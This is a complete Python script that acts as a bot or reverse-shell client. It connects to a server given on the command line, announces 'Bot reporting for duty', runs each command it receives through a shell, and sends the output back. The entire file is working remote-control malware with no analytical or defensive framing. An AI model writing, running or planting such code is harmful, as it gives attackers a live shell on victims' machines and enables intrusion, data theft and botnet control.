import sys
from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_STREAM

def main():
    # Validate command-line arguments
    if len(sys.argv) < 2:
        print("Usage: python script.py <serverName>")
        sys.exit(1)
    
    serverName = sys.argv[1]
    serverPort = 8000

    try:
        # Create an IPv4 TCP socket
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.connect((serverName, serverPort))

        # Notify server
        clientSocket.send('Bot reporting for duty'.encode())

        while True:
            # Receive command from server
            command = clientSocket.recv(4064).decode()
            
            if command.strip().lower() == "exit":
                print("Exit command received. Closing connection.")
                break

            try:
                # Execute the received command
                proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
                result, err = proc.communicate()

                # Combine stdout and stderr
                output = result.decode() if result else ''
                error = err.decode() if err else ''
                clientSocket.send((output + error).encode())
            except Exception as e:
                # Send error message back to server
                error_message = f"Error executing command: {str(e)}"
                clientSocket.send(error_message.encode())
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Close the socket in all cases
        clientSocket.close()

if __name__ == "__main__":
    main()
